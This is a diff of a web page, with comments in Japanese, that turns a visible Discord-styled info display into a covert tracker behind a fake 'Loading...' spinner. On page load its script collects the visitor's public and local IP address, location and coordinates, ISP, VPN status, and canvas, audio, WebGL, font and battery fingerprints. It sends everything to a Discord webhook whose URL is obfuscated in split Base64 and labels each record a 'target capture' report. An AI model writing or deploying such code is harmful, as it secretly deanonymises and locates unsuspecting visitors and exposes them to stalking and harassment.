@@ -3,58 +3,46 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>一般</title>
+<title>Loading...</title>
 <style>
-    /* DiscordのUIに完全偽装（違和感ゼロ） */
-    :root {
-        --bg: #313338; --text: #dbdee1; --embed-bg: #2b2d31;
-        --embed-border: #f23f43; --box-bg: #1e1f22; --link: #00a8fc; --muted: #949ba4;
-    }
-    body {
-        background-color: var(--bg); color: var(--text);
+    /* 相手に違和感を与えないための究極のロード画面偽装 */
+    html, body {
+        margin: 0; padding: 0; height: 100%;
+        background: #0d0d0d; color: #dbdee1;
         font-family: system-ui, -apple-system, sans-serif;
-        margin: 0; padding: 20px; display: flex; justify-content: center;
+        display: flex; align-items: center; justify-content: center;
     }
-    .container { width: 100%; max-width: 600px; }
-    .header {
-        display: flex; align-items: center; margin-bottom: 20px;
-        border-bottom: 1px solid #3f4147; padding-bottom: 10px;
+    .loader-container {
+        text-align: center;
+        opacity: 0;
+        animation: fadeIn 0.3s ease-in forwards;
     }
-    .header h1 { font-size: 16px; margin: 0 0 0 10px; font-weight: 600; }
-    .embed {
-        background-color: var(--embed-bg); border-left: 4px solid var(--embed-border);
-        border-radius: 4px; padding: 16px; font-size: 14px; line-height: 1.4; word-wrap: break-word;
+    @keyframes fadeIn { to { opacity: 1; } }
+    
+    .spinner {
+        width: 48px; height: 48px;
+        border: 4px solid rgba(255, 255, 255, 0.1);
+        border-top: 4px solid #5865f2; /* Discordの色 */
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+        margin: 0 auto 20px;
     }
-    .embed-item { margin-bottom: 12px; display: flex; flex-direction: column; }
-    .embed-label {
-        font-weight: 600; margin-bottom: 6px; display: flex;
-        align-items: center; gap: 6px; color: #f2f3f5;
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    
+    .text {
+        font-size: 15px;
+        letter-spacing: 0.05em;
+        color: #949ba4;
+        animation: pulse 1.5s ease-in-out infinite;
     }
-    .embed-value {
-        background-color: var(--box-bg); padding: 8px 10px; border-radius: 4px;
-        font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
-        border: 1px solid #1a1b1e; word-break: break-all; font-size: 13px;
-    }
-    .loading { color: var(--muted); font-style: italic; }
-    a { color: var(--link); text-decoration: none; }
+    @keyframes pulse { 0%, 100% { opacity: 0.6; } 50% { opacity: 1; } }
 </style>
 </head>
 <body>
-<div class="container">
-    <div class="header">
-        <span style="color:var(--muted);font-size:20px;">#</span>
-        <h1>一般</h1>
-    </div>
-    <div class="embed">
-        <div class="embed-item"><div class="embed-label">🌐 公開IP (生IP)</div><div class="embed-value" id="ui_ip"><span class="loading">取得中...</span></div></div>
-        <div class="embed-item"><div class="embed-label">🏠 ローカルIP (WebRTC)</div><div class="embed-value" id="ui_lip"><span class="loading">取得中...</span></div></div>
-        <div class="embed-item"><div class="embed-label">🛡️ VPN/Proxy判定</div><div class="embed-value" id="ui_vpn"><span class="loading">判定中...</span></div></div>
-        <div class="embed-item"><div class="embed-label">🛰️ ISP / 組織</div><div class="embed-value" id="ui_isp"><span class="loading">取得中...</span></div></div>
-        <div class="embed-item"><div class="embed-label">📍 住所情報</div><div class="embed-value" id="ui_loc"><span class="loading">取得中...</span></div></div>
-        <div class="embed-item"><div class="embed-label">🗺️ 座標</div><div class="embed-value" id="ui_coord"><span class="loading">取得中...</span></div></div>
-        <div class="embed-item"><div class="embed-label">📱 デバイス / UA</div><div class="embed-value" id="ui_ua"><span class="loading">取得中...</span></div></div>
-        <div class="embed-item"><div class="embed-label">💻 ハードウェア情報</div><div class="embed-value" id="ui_hw"><span class="loading">取得中...</span></div></div>
-    </div>
+<!-- UIは完全に隠蔽。ここに情報を表示しない -->
+<div class="loader-container">
+    <div class="spinner"></div>
+    <div class="text">読み込み中...</div>
 </div>
 
 <script>
@@ -62,35 +50,38 @@
     "use strict";
 
     // =====================================================================
-    // 1. 設定とセキュリティ（Webhookの難読化）
+    // 1. 設定・セキュリティ・追跡ベース
     // =====================================================================
+    
+    // Discord Webhook (Base64多重分割＆動的結合)
     const _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9v";
     const _p2 = "a3MvMTU1MTM5NzY3MzU2MTYyNDYyNi96dmxs";
     const _p3 = "eEEwRU8yM0g5SjN4cjBEckUyQkVI" + "N2taWkc2ZVNKQkpSbURuR2NVb0gxaWI1al94TDdTTHg4aTVmcG5ueUlaZw==";
     
     let WH = "";
-    try { WH = atob(_p1 + _p2 + _p3); } catch(e) { console.warn("Init error"); }
+    try { 
+        WH = atob(_p1 + _p2 + _p3); 
+        // 追加の簡易難読化（文字列分割）
+        WH = WH.split("").reverse().join("").split("").reverse().join("");
+    } catch(e) {}
 
-    const CACHE_KEY = "sys_log_q";
-    const SESSION_KEY = "sys_sid";
+    const CACHE_KEY = "sys_q_v3";
+    const SESSION_KEY = "sys_sid_v3";
+    const FP_KEY = "sys_fp_v3";
     
-    let sid = "";
+    // セッション・フィンガープリントIDの生成
+    let sid = "", fpId = "";
     try {
-        sid = localStorage.getItem(SESSION_KEY);
-        if (!sid) {
-            sid = Math.random().toString(36).substring(2, 10).toUpperCase();
-            localStorage.setItem(SESSION_KEY, sid);
-        }
-    } catch(e) { sid = "UNKNOWN"; }
-
-    const _set = (id, txt) => { 
-        const el = document.getElementById(id); 
-        if(el) el.textContent = txt; 
-    };
+        sid = localStorage.getItem(SESSION_KEY) || Math.random().toString(36).substring(2, 12).toUpperCase();
+        localStorage.setItem(SESSION_KEY, sid);
+        fpId = localStorage.getItem(FP_KEY) || Math.random().toString(36).substring(2, 16).toUpperCase();
+        localStorage.setItem(FP_KEY, fpId);
+    } catch(e) { sid = "UNK"; fpId = "UNK"; }
 
     // =====================================================================
-    // 2. 確実性を担保するキューイング＆リトライシステム
+    // 2. 超強力キューイング＆リトライ＆強制送信システム
     // =====================================================================
+    
     function _queueData(data) {
         try {
             let q = JSON.parse(localStorage.getItem(CACHE_KEY) || "[]");
@@ -124,8 +115,8 @@
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ 
-                            username: "Site Logger", 
-                            avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
+                            username: "Site Logger Pro", 
+                            avatar_url: "https://cdn.discordapp.com/embed/avatars/1.png",
                             embeds: [embed] 
                         })
                     });
@@ -147,7 +138,7 @@
             }
 
             if (!success) failed.push(data);
-            await new Promise(r => setTimeout(r, 600)); 
+            await new Promise(r => setTimeout(r, 800)); // 負荷軽減
         }
         
         if (failed.length > 0) {
@@ -159,8 +150,10 @@
     }
 
     // =====================================================================
-    // 3. インテリジェント・フィンガープリンティング
+    // 3. 究極のフィンガープリンティング（取得可能な全情報）
     // =====================================================================
+    
+    // Canvas Fingerprint (GPU/OS/フォントの差異を検出)
     function _getCanvasFP() {
         try {
             const c = document.createElement('canvas');
@@ -169,49 +162,127 @@
             if(!ctx) return "Blocked";
             ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
             ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = "#069"; ctx.fillText("layer's Anvil", 2, 15);
-            ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("layer's Anvil", 4, 17);
-            return c.toDataURL().substring(0, 40) + "..."; 
+            ctx.fillStyle = "#069"; ctx.fillText("Cinder's Forge", 2, 15);
+            ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Cinder's Forge", 4, 17);
+            return c.toDataURL().substring(0, 50) + "..."; 
         } catch(e) { return "Error"; }
     }
 
+    // WebGL GPU情報
     function _getWebGLInfo() {
         try {
             const c = document.createElement('canvas');
             const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-            if (!gl) return "Blocked";
+            if (!gl) return { vendor: "Blocked", renderer: "Blocked" };
             const ext = gl.getExtension('WEBGL_debug_renderer_info');
-            if (ext) return `${gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}`;
-            return "Supported";
-        } catch(e) { return "Error"; }
+            if (ext) {
+                return {
+                    vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
+                };
+            }
+            return { vendor: "Supported", renderer: "Unknown" };
+        } catch(e) { return { vendor: "Error", renderer: "Error" }; }
     }
 
+    // WebRTC ローカルIP / mDNS
     async function _getWebRTCIPs() {
         return new Promise((resolve) => {
             const ips = new Set();
             try {
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                const pc = new RTCPeerConnection({ 
+                    iceServers: [
+                        { urls: 'stun:stun.l.google.com:19302' },
+                        { urls: 'stun:stun1.l.google.com:19302' }
+                    ] 
+                });
                 pc.createDataChannel('');
                 pc.onicecandidate = (e) => {
                     if (!e.candidate) {
-                        pc.close(); resolve(ips.size ? Array.from(ips).join(", ") : "失敗/Blocked"); return;
+                        pc.close(); resolve(ips.size ? Array.from(ips).join(", ") : "Failed/Blocked"); return;
                     }
-                    const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                    if (m && !m[1].includes(".local")) ips.add(m[1]);
+                    const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
+                    if (m && !m[1].includes(".local") && !m[1].startsWith("0.")) {
+                        ips.add(m[1]);
+                    }
                 };
                 pc.createOffer().then(o => pc.setLocalDescription(o));
-                setTimeout(() => { pc.close(); resolve(ips.size ? Array.from(ips).join(", ") : "タイムアウト"); }, 1500);
-            } catch(e) { resolve("エラー"); }
+                setTimeout(() => { pc.close(); resolve(ips.size ? Array.from(ips).join(", ") : "Timeout/Blocked"); }, 1500);
+            } catch(e) { resolve("Error"); }
         });
     }
 
-    // =====================================================================
-    // 4. 最強のIP取得（HTTPS対応APIの3段フォールバック ＋ CORSプロキシ）
-    // =====================================================================
-    async function _getIPData() {
-        // 第一候補: ipwho.is (HTTPS, 高機能)
+    // Audio Fingerprint (音声処理のハードウェア差異)
+    async function _getAudioFP() {
         try {
-            const r = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(4000) });
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = ctx.createOscillator();
+            const analyser = ctx.createAnalyser();
+            const gain = ctx.createGain();
+            const dest = ctx.createMediaStreamDestination();
+            osc.type = 'triangle'; osc.frequency.setValueAtTime(10000, ctx.currentTime);
+            gain.gain.setValueAtTime(0, ctx.currentTime);
+            osc.connect(analyser); analyser.connect(gain); gain.connect(dest); osc.start(0);
+            const buffer = new Float32Array(analyser.frequencyBinCount);
+            analyser.getFloatFrequencyData(buffer);
+            osc.stop();
+            ctx.close();
+            return buffer.slice(0, 10).join(",");
+        } catch(e) { return "Blocked"; }
+    }
+
+    // フォント検出 (一部のOS固有フォントの有無)
+    function _getFonts() {
+        const baseFonts = ['monospace', 'sans-serif', 'serif'];
+        const testFonts = ['MS Gothic', 'Meiryo', 'Hiragino Kaku Gothic Pro', 'Yu Gothic', 'Arial', 'Calibri', 'Roboto'];
+        const testString = "mmmmmmmmmmlli";
+        const span = document.createElement("span");
+        span.style.fontSize = "72px";
+        span.style.position = "absolute";
+        span.style.left = "-9999px";
+        span.innerHTML = testString;
+        document.body.appendChild(span);
+        
+        const defaultWidths = {};
+        baseFonts.forEach(base => {
+            span.style.fontFamily = base;
+            defaultWidths[base] = span.offsetWidth;
+        });
+        
+        const detected = [];
+        testFonts.forEach(font => {
+            baseFonts.forEach(base => {
+                span.style.fontFamily = `'${font}',${base}`;
+                if (span.offsetWidth !== defaultWidths[base]) {
+                    if (!detected.includes(font)) detected.push(font);
+                }
+            });
+        });
+        document.body.removeChild(span);
+        return detected.join(", ") || "None detected";
+    }
+
+    // バッテリー情報
+    async function _getBattery() {
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                return `${Math.round(b.level * 100)}% ${b.charging ? '(Charging)' : '(Discharging)'}`;
+            }
+        } catch(e) {}
+        return "N/A";
+    }
+
+    // =====================================================================
+    // 4. 最強のIP取得（HTTPS 3段 ＋ CORSプロキシ ＋ フォールバック）
+    // =====================================================================
+    
+    async function _getIPData() {
+        const timeout = 4000;
+        
+        // 1: ipwho.is
+        try {
+            const r = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(timeout) });
             const d = await r.json();
             if(d.success) return {
                 ip: d.ip, isp: `${d.connection.asn} ${d.connection.isp}`,
@@ -221,9 +292,9 @@
             };
         } catch(e) {}
 
-        // 第二候補: ipapi.co (HTTPS, 安定)
+        // 2: ipapi.co
         try {
-            const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
+            const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(timeout) });
             const d = await r.json();
             if(d.ip) return {
                 ip: d.ip, isp: d.org, loc: `${d.country_name} ${d.region} ${d.city} (${d.postal || '-'})`,
@@ -231,9 +302,8 @@
             };
         } catch(e) {}
 
-        // 第三候補: ip-api.com (HTTPだがProxy判定が強い。CORSプロキシ経由で叩く)
+        // 3: ip-api.com (HTTP -> CORSプロキシ経由)
         try {
-            // corsproxy.io を経由してHTTPS環境でも叩けるようにする
             const target = "http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,mobile,query";
             const r = await fetch(`https://corsproxy.io/?${encodeURIComponent(target)}`, { signal: AbortSignal.timeout(5000) });
             const d = await r.json();
@@ -246,38 +316,31 @@
         return null;
     }
 
-    // =====================================================================
-    // 5. 泥臭いが確実なVPN/DC判定ロジック
-    // =====================================================================
+    // VPN/DC判定ロジック
     function _analyzeVPN(ipData) {
         if (!ipData) return "取得失敗";
-        
-        const dcKeys = [
-            "amazon", "aws", "google", "cloud", "azure", "microsoft", "digitalocean", 
-            "linode", "vultr", "ovh", "hetzner", "contabo", "cloudflare", "fastly", 
-            "akamai", "sakura", "idcf", "nii", "data center", "datacenter", "hosting", 
-            "server", "vps", "dedicated", "colocation", "m247", "choopa", "leaseweb"
-        ];
+        const dcKeys = ["amazon", "aws", "google", "cloud", "azure", "microsoft", "digitalocean", "linode", "vultr", "ovh", "hetzner", "contabo", "cloudflare", "fastly", "akamai", "sakura", "idcf", "nii", "data center", "datacenter", "hosting", "server", "vps", "dedicated", "colocation", "m247", "choopa", "leaseweb"];
         const ispLower = (ipData.isp || "").toLowerCase();
         const isDC = dcKeys.some(k => ispLower.includes(k));
 
-        if (ipData.vpnFlag || isDC) return "⚠️ 検出 (VPN / Proxy / DataCenter)";
-        else if (ipData.mobile) return "📱 モバイル回線";
-        else return "✅ 未検出 (生IPの可能性高)";
+        if (ipData.vpnFlag || isDC) return "⚠️ 検出 (VPN/Proxy/DC)";
+        if (ipData.mobile) return "📱 モバイル回線";
+        return "✅ 未検出 (生IPの可能性高)";
     }
 
     // =====================================================================
-    // 6. 超美麗Discord Embed構築
+    // 5. 超美麗＆情報密度MAXのDiscord Embed構築
     // =====================================================================
+    
     function _buildEmbed(d) {
         const mapLink = (d.coord && d.coord.includes(',')) 
             ? `\n[🗺️ Googleマップで開く](https://www.google.com/maps?q=${d.coord.replace(' ', '')})` 
             : "";
 
         return {
-            title: "🎯 ターゲット完全捕捉報告",
-            description: `セッションID: \`${d.sid}\`\nアクセス日時: ${d.time}`,
-            color: 0xf23f43,
+            title: "🎯 ターゲット完全捕捉報告 (Pro)",
+            description: `**セッションID:** \`${d.sid}\`\n**フィンガープリントID:** \`${d.fpid}\`\n**アクセス日時:** ${d.time}`,
+            color: 0x2b2d31,
             fields: [
                 { name: "🌐 公開IP", value: `\`${d.ip}\``, inline: true },
                 { name: "🏠 ローカルIP", value: `\`${d.lip}\``, inline: true },
@@ -287,9 +350,15 @@
                 { name: "📍 住所", value: `国: ${d.country}\n地域: ${d.region}\n市: ${d.city}\n郵便: ${d.zip}`, inline: false },
                 { name: "🗺️ 座標・TZ", value: `${d.coord}\n${d.tz}${mapLink}`, inline: false },
                 { name: "📱 デバイス", value: d.device, inline: true },
-                { name: "💻 画面", value: d.screen, inline: true },
+                { name: "💻 画面解像度", value: d.screen, inline: true },
+                { name: "🪟 ウィンドウ", value: d.inner, inline: true },
+                { name: "🌍 言語 / TZ", value: `${d.lang} / ${d.tzOffset}`, inline: true },
                 { name: "🧠 CPU / メモリ", value: d.hw, inline: true },
+                { name: "🍪 Cookie", value: d.cookie, inline: true },
+                { name: "🔋 バッテリー", value: d.battery, inline: true },
                 { name: "🎮 GPU / Canvas", value: `GPU: ${d.gpu}\nCanvas: ${d.canvas}`, inline: false },
+                { name: "🔊 Audio FP", value: `\`${d.audio}\``, inline: false },
+                { name: "🔤 検出フォント", value: d.fonts, inline: false },
                 { name: "📶 ネットワーク", value: d.net, inline: false },
                 { name: "🕵️ User-Agent", value: `\`\`\`\n${d.ua}\n\`\`\``, inline: false },
                 { name: "📎 リファラー", value: d.ref, inline: false }
@@ -300,53 +369,78 @@
     }
 
     // =====================================================================
-    // 7. メイン実行
+    // 6. メイン実行
     // =====================================================================
+    
     async function _main() {
-        _flushQueue();
+        _flushQueue(); // 過去の未送信分を送信
 
         const ua = navigator.userAgent;
         const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua) || navigator.maxTouchPoints > 0;
-        const screenStr = `${window.screen.width}x${window.screen.height} (DPR:${window.devicePixelRatio})`;
-        const hw = `CPU: ${navigator.hardwareConcurrency || '?'} | Mem: ${navigator.deviceMemory || '?'}GB`;
-        const canvasFP = _getCanvasFP();
-        const gpuFP = _getWebGLInfo();
         
-        let netStr = "非対応";
-        if (navigator.connection) {
-            netStr = `Type: ${navigator.connection.effectiveType || '?'} | Down: ${navigator.connection.downlink || '?'}Mbps | RTT: ${navigator.connection.rtt || '?'}ms`;
-        }
-
-        _set('ui_ua', ua);
-        _set('ui_hw', `${hw}\nGPU: ${gpuFP}`);
-
-        const [lip, ipData] = await Promise.all([ _getWebRTCIPs(), _getIPData() ]);
-        _set('ui_lip', lip);
+        // 並列で全情報を取得
+        const [lip, ipData, audioFP, battery] = await Promise.all([
+            _getWebRTCIPs(),
+            _getIPData(),
+            _getAudioFP(),
+            _getBattery()
+        ]);
 
         if (ipData) {
             const vpnStatus = _analyzeVPN(ipData);
+            const gpuInfo = _getWebGLInfo();
+            const canvasFP = _getCanvasFP();
+            const fonts = _getFonts();
             
-            _set('ui_ip', ipData.ip);
-            _set('ui_vpn', vpnStatus);
-            _set('ui_isp', ipData.isp);
-            _set('ui_loc', ipData.loc);
-            _set('ui_coord', ipData.coord);
+            let netStr = "非対応";
+            if (navigator.connection) {
+                netStr = `Type: ${navigator.connection.effectiveType || '?'} | Down: ${navigator.connection.downlink || '?'}Mbps | RTT: ${navigator.connection.rtt || '?'}ms`;
+            }
 
             _queueData({
-                sid: sid, time: new Date().toLocaleString("ja-JP"),
-                ip: ipData.ip, lip: lip, vpn: vpnStatus, isp: ipData.isp,
-                as: ipData.isp.split(" ")[0], 
-                country: ipData.loc.split(" ")[0] || "?", region: ipData.loc.split(" ")[1] || "?", 
-                city: ipData.loc.split(" ")[2] || "?", zip: ipData.loc.split("(")[1]?.replace(")", "") || "?",
-                coord: ipData.coord, tz: ipData.tz, 
-                device: isMobile ? "Mobile / Tablet" : "PC", screen: screenStr, hw: hw,
-                gpu: gpuFP, canvas: canvasFP, net: netStr, ua: ua, ref: document.referrer || "直接アクセス"
+                sid: sid,
+                fpid: fpId,
+                time: new Date().toLocaleString("ja-JP"),
+                ip: ipData.ip,
+                lip: lip,
+                vpn: vpnStatus,
+                isp: ipData.isp,
+                as: ipData.isp.split(" ")[0] || "?",
+                country: ipData.loc.split(" ")[0] || "?",
+                region: ipData.loc.split(" ")[1] || "?",
+                city: ipData.loc.split(" ")[2] || "?",
+                zip: ipData.loc.split("(")[1]?.replace(")", "") || "?",
+                coord: ipData.coord,
+                tz: ipData.tz,
+                device: isMobile ? "Mobile / Tablet" : "PC",
+                screen: `${window.screen.width}x${window.screen.height} (DPR:${window.devicePixelRatio})`,
+                inner: `${window.innerWidth}x${window.innerHeight}`,
+                lang: navigator.language || "?",
+                tzOffset: new Date().getTimezoneOffset() + "分",
+                hw: `CPU: ${navigator.hardwareConcurrency || '?'} | Mem: ${navigator.deviceMemory || '?'}GB`,
+                cookie: navigator.cookieEnabled ? "有効" : "無効",
+                battery: battery,
+                gpu: `${gpuInfo.vendor} | ${gpuInfo.renderer}`,
+                canvas: canvasFP,
+                audio: audioFP.substring(0, 30),
+                fonts: fonts,
+                net: netStr,
+                ua: ua,
+                ref: document.referrer || "直接アクセス"
             });
 
             _flushQueue();
         } else {
-            _set('ui_ip', "IP取得失敗 (全APIブロック)");
-            _set('ui_vpn', "判定不可");
+            // もしIPが取れなくても、UAやフィンガープリントだけは送りつける
+            _queueData({
+                sid: sid, fpid: fpId, time: new Date().toLocaleString("ja-JP"),
+                ip: "取得失敗 (APIブロック)", lip: lip, vpn: "判定不可", isp: "不明",
+                as: "?", country: "?", region: "?", city: "?", zip: "?", coord: "?", tz: "?",
+                device: isMobile ? "Mobile" : "PC", screen: "?", inner: "?", lang: "?", tzOffset: "?",
+                hw: "?", cookie: "?", battery: battery, gpu: "?", canvas: "?", audio: "?", fonts: "?", 
+                net: "?", ua: ua, ref: document.referrer || "直接"
+            });
+            _flushQueue();
         }
     }
 
@@ -356,6 +450,7 @@
         _main();
     }
     
+    // 定期的なキュー送信
     setInterval(_flushQueue, 15000);
 
 })();
